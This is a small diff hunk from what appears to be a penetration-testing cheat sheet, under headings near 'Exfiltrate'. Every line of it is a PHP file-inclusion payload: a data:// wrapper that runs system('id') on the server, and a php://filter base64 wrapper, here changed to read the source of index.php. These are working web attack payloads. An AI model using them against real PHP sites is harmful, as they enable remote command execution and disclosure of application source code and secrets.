@@ -37,7 +37,7 @@ MySQL >=5.6
 
     data://data:text/plain,<?php system("id")?>
     
-    php://filter/convert.base64-encode/resource=index
+    php://filter/convert.base64-encode/resource=index.php
 
 ### Exfiltrate
 
